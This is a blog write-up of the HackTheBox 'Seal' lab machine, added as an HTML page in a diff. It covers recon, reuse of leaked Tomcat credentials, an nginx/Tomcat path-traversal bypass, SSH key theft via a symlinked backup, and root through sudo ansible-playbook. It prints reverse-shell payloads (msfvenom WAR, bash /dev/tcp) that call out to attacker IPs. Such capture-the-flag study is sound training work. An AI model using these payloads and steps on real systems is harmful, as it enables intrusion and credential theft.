@@ -1,0 +1,268 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+  <meta name="generator" content="Jekyll">
+
+  <title>Seal HackTheBox</title>
+
+  <link rel="stylesheet" href="/css/main.css">
+  
+  <link href="/atom.xml" type="application/atom+xml" rel="alternate" title="ATOM Feed" /> <!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Seal HackTheBox | Dennis Blog</title>
+<meta name="generator" content="Jekyll v4.2.2" />
+<meta property="og:title" content="Seal HackTheBox" />
+<meta name="author" content="Dennis" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Recon" />
+<meta property="og:description" content="Recon" />
+<link rel="canonical" href="http://localhost:4000/Seal" />
+<meta property="og:url" content="http://localhost:4000/Seal" />
+<meta property="og:site_name" content="Dennis Blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2022-09-05T00:00:00+02:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Seal HackTheBox" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Dennis","url":"https://www.github.com/DennisFeldbusch"},"dateModified":"2022-09-05T00:00:00+02:00","datePublished":"2022-09-05T00:00:00+02:00","description":"Recon","headline":"Seal HackTheBox","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/Seal"},"url":"http://localhost:4000/Seal"}</script>
+<!-- End Jekyll SEO tag -->
+
+</head>
+
+<body>
+  <div id="wrapper">
+    <header>
+  <div>
+    <a href="/">
+    
+    <h1>dennis@home:~$</h1>
+    </a>
+    <div class="header-links">
+      <a href="/archive"><h2 class="header-link">Archive</h2></a>
+<a href="/about"><h2 class="header-link">About</h2></a>
+<a href="/atom.xml"><h2 class="header-link">RSS</h2></a>
+<!-- HTML search field -->
+<div id="search-container">
+<input type="text" id="search-input" placeholder="Type your search here...">
+<ul id="results-container"></ul>
+</div>
+
+<!-- Grab search-script.js -->
+<script src="/assets/js/search-script.js" type="text/javascript"></script>
+
+<!-- Configuration -->
+<script>
+SimpleJekyllSearch({
+  searchInput: document.getElementById('search-input'),
+  resultsContainer: document.getElementById('results-container'),
+  json: '/search.json',
+  searchResultTemplate: '<li><a href="{url}">{title}</a><br><span class="post-meta">{date}</span></li>'
+})
+</script>
+
+
+    </div>
+  </div>
+</header>
+    <div class="container">
+      <section id="main_content">
+        <article>
+  <h2>Seal HackTheBox</h2>
+  <time datetime="2022-09-05T00:00:00+02:00" class="by-line">05 Sep 2022</time>
+  <h2 id="recon">Recon</h2>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-Ao</span> nmap 10.10.10.250
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2022-09-02 08:33 CEST
+Nmap scan report <span class="k">for </span>10.10.10.250
+Host is up <span class="o">(</span>0.023s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 997 closed tcp ports <span class="o">(</span>conn-refused<span class="o">)</span>
+PORT     STATE SERVICE    VERSION
+22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey:
+|   3072 4b:89:47:39:67:3d:07:31:5e:3f:4c:27:41:1f:f9:67 <span class="o">(</span>RSA<span class="o">)</span>
+|   256 04:a7:4f:39:95:65:c5:b0:8d:d5:49:2e:d8:44:00:36 <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 b4:5e:83:93:c5:42:49:de:71:25:92:71:23:b1:85:54 <span class="o">(</span>ED25519<span class="o">)</span>
+443/tcp  open  ssl/http   nginx 1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
+|_http-title: Seal Market
+| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>seal.htb/organizationName<span class="o">=</span>Seal Pvt Ltd/stateOrProvinceName<span class="o">=</span>London/countryName<span class="o">=</span>UK
+| Not valid before: 2021-05-05T10:24:03
+|_Not valid after:  2022-05-05T10:24:03
+| tls-nextprotoneg:
+|_  http/1.1
+|_http-server-header: nginx/1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
+| tls-alpn:
+|_  http/1.1
+|_ssl-date: TLS randomness does not represent <span class="nb">time
+</span>8080/tcp open  http-proxy
+| fingerprint-strings:
+|   FourOhFourRequest:
+|     HTTP/1.1 401 Unauthorized
+|     Date: Fri, 02 Sep 2022 06:32:57 GMT
+|     Set-Cookie: <span class="nv">JSESSIONID</span><span class="o">=</span>node01j0kvq70qbpqj11e6pkvdnh6s32.node0<span class="p">;</span> <span class="nv">Path</span><span class="o">=</span>/<span class="p">;</span> HttpOnly
+|     Expires: Thu, 01 Jan 1970 00:00:00 GMT
+|     Content-Type: text/html<span class="p">;</span><span class="nv">charset</span><span class="o">=</span>utf-8
+|     Content-Length: 0
+|   GetRequest:
+|     HTTP/1.1 401 Unauthorized
+|     Date: Fri, 02 Sep 2022 06:32:56 GMT
+|     Set-Cookie: <span class="nv">JSESSIONID</span><span class="o">=</span>node05fxtqecve3hh15vos2gljmegx0.node0<span class="p">;</span> <span class="nv">Path</span><span class="o">=</span>/<span class="p">;</span> HttpOnly
+|     Expires: Thu, 01 Jan 1970 00:00:00 GMT
+|     Content-Type: text/html<span class="p">;</span><span class="nv">charset</span><span class="o">=</span>utf-8
+|     Content-Length: 0
+|   HTTPOptions:
+|     HTTP/1.1 200 OK
+|     Date: Fri, 02 Sep 2022 06:32:57 GMT
+|     Set-Cookie: <span class="nv">JSESSIONID</span><span class="o">=</span>node0sh26ekxv2537kx25ph8zd1m1.node0<span class="p">;</span> <span class="nv">Path</span><span class="o">=</span>/<span class="p">;</span> HttpOnly
+|     Expires: Thu, 01 Jan 1970 00:00:00 GMT
+|     Content-Type: text/html<span class="p">;</span><span class="nv">charset</span><span class="o">=</span>utf-8
+|     Allow: GET,HEAD,POST,OPTIONS
+|     Content-Length: 0
+|   RPCCheck:
+|     HTTP/1.1 400 Illegal character <span class="nv">OTEXT</span><span class="o">=</span>0x80
+|     Content-Type: text/html<span class="p">;</span><span class="nv">charset</span><span class="o">=</span>iso-8859-1
+|     Content-Length: 71
+|     Connection: close
+|     &lt;h1&gt;Bad Message 400&lt;/h1&gt;&lt;pre&gt;reason: Illegal character <span class="nv">OTEXT</span><span class="o">=</span>0x80&lt;/pre&gt;
+|   RTSPRequest:
+|     HTTP/1.1 505 Unknown Version
+|     Content-Type: text/html<span class="p">;</span><span class="nv">charset</span><span class="o">=</span>iso-8859-1
+|     Content-Length: 58
+|     Connection: close
+|     &lt;h1&gt;Bad Message 505&lt;/h1&gt;&lt;pre&gt;reason: Unknown Version&lt;/pre&gt;
+|   Socks4:
+|     HTTP/1.1 400 Illegal character <span class="nv">CNTL</span><span class="o">=</span>0x4
+|     Content-Type: text/html<span class="p">;</span><span class="nv">charset</span><span class="o">=</span>iso-8859-1
+|     Content-Length: 69
+|     Connection: close
+|     &lt;h1&gt;Bad Message 400&lt;/h1&gt;&lt;pre&gt;reason: Illegal character <span class="nv">CNTL</span><span class="o">=</span>0x4&lt;/pre&gt;
+|   Socks5:
+|     HTTP/1.1 400 Illegal character <span class="nv">CNTL</span><span class="o">=</span>0x5
+|     Content-Type: text/html<span class="p">;</span><span class="nv">charset</span><span class="o">=</span>iso-8859-1
+|     Content-Length: 69
+|     Connection: close
+|_    &lt;h1&gt;Bad Message 400&lt;/h1&gt;&lt;pre&gt;reason: Illegal character <span class="nv">CNTL</span><span class="o">=</span>0x5&lt;/pre&gt;
+|_http-title: Site doesn<span class="s1">'t have a title (text/html;charset=utf-8).
+| http-auth:
+| HTTP/1.1 401 Unauthorized\x0D
+|_  Server returned status 401 but no WWW-Authenticate header.
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port8080-TCP:V=7.92%I=7%D=9/2%Time=6311A3A4%P=x86_64-pc-linux-gnu%r(Get
+SF:Request,F4,"HTTP/1\.1\x20401\x20Unauthorized\r\nDate:\x20Fri,\x2002\x20
+SF:Sep\x202022\x2006:32:56\x20GMT\r\nSet-Cookie:\x20JSESSIONID=node05fxtqe
+SF:cve3hh15vos2gljmegx0\.node0;\x20Path=/;\x20HttpOnly\r\nExpires:\x20Thu,
+SF:\x2001\x20Jan\x201970\x2000:00:00\x20GMT\r\nContent-Type:\x20text/html;
+SF:charset=utf-8\r\nContent-Length:\x200\r\n\r\n")%r(HTTPOptions,106,"HTTP
+SF:/1\.1\x20200\x20OK\r\nDate:\x20Fri,\x2002\x20Sep\x202022\x2006:32:57\x2
+SF:0GMT\r\nSet-Cookie:\x20JSESSIONID=node0sh26ekxv2537kx25ph8zd1m1\.node0;
+SF:\x20Path=/;\x20HttpOnly\r\nExpires:\x20Thu,\x2001\x20Jan\x201970\x2000:
+SF:00:00\x20GMT\r\nContent-Type:\x20text/html;charset=utf-8\r\nAllow:\x20G
+SF:ET,HEAD,POST,OPTIONS\r\nContent-Length:\x200\r\n\r\n")%r(RTSPRequest,AD
+SF:,"HTTP/1\.1\x20505\x20Unknown\x20Version\r\nContent-Type:\x20text/html;
+SF:charset=iso-8859-1\r\nContent-Length:\x2058\r\nConnection:\x20close\r\n
+SF:\r\n&lt;h1&gt;Bad\x20Message\x20505&lt;/h1&gt;&lt;pre&gt;reason:\x20Unknown\x20Version&lt;/p
+SF:re&gt;")%r(FourOhFourRequest,F5,"HTTP/1\.1\x20401\x20Unauthorized\r\nDate:
+SF:\x20Fri,\x2002\x20Sep\x202022\x2006:32:57\x20GMT\r\nSet-Cookie:\x20JSES
+SF:SIONID=node01j0kvq70qbpqj11e6pkvdnh6s32\.node0;\x20Path=/;\x20HttpOnly\
+SF:r\nExpires:\x20Thu,\x2001\x20Jan\x201970\x2000:00:00\x20GMT\r\nContent-
+SF:Type:\x20text/html;charset=utf-8\r\nContent-Length:\x200\r\n\r\n")%r(So
+SF:cks5,C3,"HTTP/1\.1\x20400\x20Illegal\x20character\x20CNTL=0x5\r\nConten
+SF:t-Type:\x20text/html;charset=iso-8859-1\r\nContent-Length:\x2069\r\nCon
+SF:nection:\x20close\r\n\r\n&lt;h1&gt;Bad\x20Message\x20400&lt;/h1&gt;&lt;pre&gt;reason:\x20
+SF:Illegal\x20character\x20CNTL=0x5&lt;/pre&gt;")%r(Socks4,C3,"HTTP/1\.1\x20400\
+SF:x20Illegal\x20character\x20CNTL=0x4\r\nContent-Type:\x20text/html;chars
+SF:et=iso-8859-1\r\nContent-Length:\x2069\r\nConnection:\x20close\r\n\r\n&lt;
+SF:h1&gt;Bad\x20Message\x20400&lt;/h1&gt;&lt;pre&gt;reason:\x20Illegal\x20character\x20CN
+SF:TL=0x4&lt;/pre&gt;")%r(RPCCheck,C7,"HTTP/1\.1\x20400\x20Illegal\x20character\
+SF:x20OTEXT=0x80\r\nContent-Type:\x20text/html;charset=iso-8859-1\r\nConte
+SF:nt-Length:\x2071\r\nConnection:\x20close\r\n\r\n&lt;h1&gt;Bad\x20Message\x204
+SF:00&lt;/h1&gt;&lt;pre&gt;reason:\x20Illegal\x20character\x20OTEXT=0x80&lt;/pre&gt;");
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 17.32 seconds
+</span></code></pre></div></div>
+
+<h2 id="interpretation">Interpretation</h2>
+
+<p>There are three open ports: 22, 443 and 8080.</p>
+
+<h2 id="port-443">Port 443</h2>
+
+<p>The website on port 433 seems to be not vulnerable. 
+There are two input possibilities but basic xss, sqli testing reveals nothing interesting.</p>
+
+<h2 id="port-8080">Port 8080</h2>
+
+<p>The application on port 8080 is GitBucket. Basic or default credentials are not wirking to login so creating a new account seems to be the way to go. We have access to two repositories. In the tomcat folder in the <code class="language-plaintext highlighter-rouge">tomcat-users.xml</code> there is no user entry but the git history reveals a deleted tomcat user with the credentials: <code class="language-plaintext highlighter-rouge">tomcat:42MrHBf*z8{Z%</code>. This password can be reused for the GitBucket service as user luis but this had no further impact. More looking around reveals that there is a nginx reverse proxy running which blocks requests to for example <code class="language-plaintext highlighter-rouge">/manager/html</code></p>
+
+<h2 id="path-traversal">Path traversal</h2>
+
+<p>This combination of tomcat and nginx is most often vulnerable to a path traversal attack as explained <a href="https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf">here</a>. <code class="language-plaintext highlighter-rouge">10.10.10.250/manager;name=dennis/html/</code> did the trick because <code class="language-plaintext highlighter-rouge">/manager;name=dennis/html</code> doesn’t match the pattern <code class="language-plaintext highlighter-rouge">/manager/html</code> checked by nginx so it forwards the request to the tomcat. The application server normalizes the reqest and throws the <code class="language-plaintext highlighter-rouge">;name=dennis</code>-part away so tomcat sees only <code class="language-plaintext highlighter-rouge">/manager/html</code>. For the managersite the previous found credentials are working so we have access to the admin panel.</p>
+
+<h2 id="exploit">Exploit</h2>
+
+<p>Creating an exploit which we can upload to the tomcat.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom <span class="nt">-p</span> java/shell_reverse_tcp <span class="nv">lhost</span><span class="o">=</span>10.10.14.4 <span class="nv">lport</span><span class="o">=</span>4242 <span class="nt">-f</span> war <span class="nt">-o</span> rev.war7
+</code></pre></div></div>
+
+<p>Upload the war-File to the adminpanel and deploy it to the tomcat.</p>
+
+<h3 id="notes-to-deploying-to-tomcat">Notes to deploying to tomcat</h3>
+
+<ol>
+  <li>Logically the request have to be intercepted with burpsuite because the deploy-Button has links to <code class="language-plaintext highlighter-rouge">/manager/html/upload...</code> which is blocked by nginx. So the path traversal should again be applied.</li>
+  <li>I had to add the host name to my <code class="language-plaintext highlighter-rouge">/etc/hosts</code>-file but I don’t know why.</li>
+</ol>
+
+<h2 id="luis-shell">Luis Shell</h2>
+
+<p>From tomcat user we have to get shell as luis. Therefore we look around and find an <a href="https://www.ansible.com/">ansible</a> playbook. This playbook under <code class="language-plaintext highlighter-rouge">/opt/backups/playbook</code> creates backups from <code class="language-plaintext highlighter-rouge">/var/lib/tomcat9/webapps/ROOT/admin/dashboard</code>. Luckily the <code class="language-plaintext highlighter-rouge">uploads</code> directory is writable by everybody. We have to symlink to home-directory from luis to that directory so next time a backup is created the home directory is also in this backup.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">ln</span> <span class="nt">-s</span> /home/luis/ /var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads/
+<span class="nb">tar </span>zxf backup-2021-09-04-07<span class="se">\:</span>59<span class="se">\:</span>32.gz <span class="nt">--force-local</span>
+<span class="nb">cd </span>luis/.ssh
+</code></pre></div></div>
+<p>We can get the <code class="language-plaintext highlighter-rouge">id_rsa</code> file from luis and connect via ssh with his private key. Don’t forget to set the wright permissions to the keyfile <code class="language-plaintext highlighter-rouge">chmod 600 key.luis</code></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh <span class="nt">-i</span> key.luis luis@seal.htb
+</code></pre></div></div>
+
+<h2 id="root">root</h2>
+
+<p>To list the commands which user luis can run without password run: <code class="language-plaintext highlighter-rouge">sudo -l</code>. 
+According to the result <code class="language-plaintext highlighter-rouge">(ALL) NOPASSWD: /usr/bin/ansible-playbook *</code> it seems like every user can run an ansible-playbook as root without a password.</p>
+
+<h2 id="ansible-commands">ansible commands</h2>
+
+<p>Looking around I found an <a href="https://rioasmara.com/2022/03/21/ansible-playbook-weaponization/">article</a> whcich describes how to weaponize the ansible-playbook and build a reverse shell with it.</p>
+
+<div class="language-yml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="pi">-</span> <span class="na">hosts</span><span class="pi">:</span> <span class="s">localhost</span>
+  <span class="na">tasks</span><span class="pi">:</span>
+  <span class="pi">-</span> <span class="na">name</span><span class="pi">:</span> <span class="s">rev</span>
+    <span class="na">shell</span><span class="pi">:</span> <span class="s">bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.18/4242 0&gt;&amp;1'</span>
+</code></pre></div></div>
+<p>Run this .yml file with <code class="language-plaintext highlighter-rouge">sudo ansible-playbook run.yml</code> and start a listener on your maschine.</p>
+
+
+</article>
+      </section>
+    </div>
+  </div>
+
+   <footer>
+  <a href="https://creativecommons.org/licenses/by-nc/3.0/deed.en_US">
+    <span>
+        <b>Dennis</b>
+    </span>
+    
+    <span>© 2022</span>
+  </a>
+</footer>
+
+  
+</body>
+
+</html>
